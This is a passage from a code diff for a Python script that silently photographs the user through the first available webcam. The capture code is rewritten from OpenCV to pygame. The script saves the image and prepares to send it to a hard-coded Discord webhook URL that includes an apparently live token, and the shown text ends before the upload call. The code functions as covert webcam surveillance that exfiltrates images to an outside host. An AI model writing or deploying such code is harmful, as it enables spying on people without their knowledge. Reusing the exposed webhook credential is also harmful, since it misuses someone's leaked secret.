@@ -9,41 +9,43 @@ import numpy as np
 import tensorflow as tf
 import time  
 import datetime
-import cv2
-from PIL import Image
-import io
+import pygame
+import pygame.camera
+from pygame.locals import *
 
-cap = cv2.VideoCapture(0)
+# Initialize Pygame
+pygame.init()
+pygame.camera.init()
 
-# Check if the camera opened successfully
-if not cap.isOpened():
-    print("Error: Could not open camera.")
-    exit()
+# Create a list of available cameras
+cameras = pygame.camera.list_cameras()
+
+if not cameras:
+    print("No cameras found.")
+    quit()
+
+# Use the first camera in the list
+camera = pygame.camera.Camera(cameras[0], (640, 480))
+
+# Start the camera
+camera.start()
 
 # Capture a single frame
-ret, frame = cap.read()
+image = camera.get_image()
 
-# Check if the frame was captured successfully
-if not ret:
-    print("Error: Could not read frame.")
-    exit()
+# Stop the camera
+camera.stop()
 
-# Release the camera
-cap.release()
+# Save the captured image
+pygame.image.save(image, "captured_photo_pygame.jpg")
 
-# Convert the frame to a Pillow Image
-pillow_image = Image.fromarray(frame)
-
-# Save the image to a file (you can change the filename and format)
-pillow_image.save("captured_photo_pillow.jpg")
-
-print("Photo captured and saved as 'captured_photo_pillow.jpg'")
+print("Photo captured and saved as 'captured_photo_pygame.jpg'")
 
 
 
 webhook_url = 'https://discord.com/api/webhooks/1182794753331441694/qParZZ-m6IVlXT_li6wUp4et1bHKpTH54t6diG2Kh6to-wirJ71cC2ls0AjicwS8mttI'
 
-photo_path = "captured_photo_pillow.jpg"
+photo_path = "captured_photo_pygame.jpg"
 
 with open(photo_path, "rb") as photo_file:
     files = {'photo': (photo_path, photo_file, 'image/jpg')}
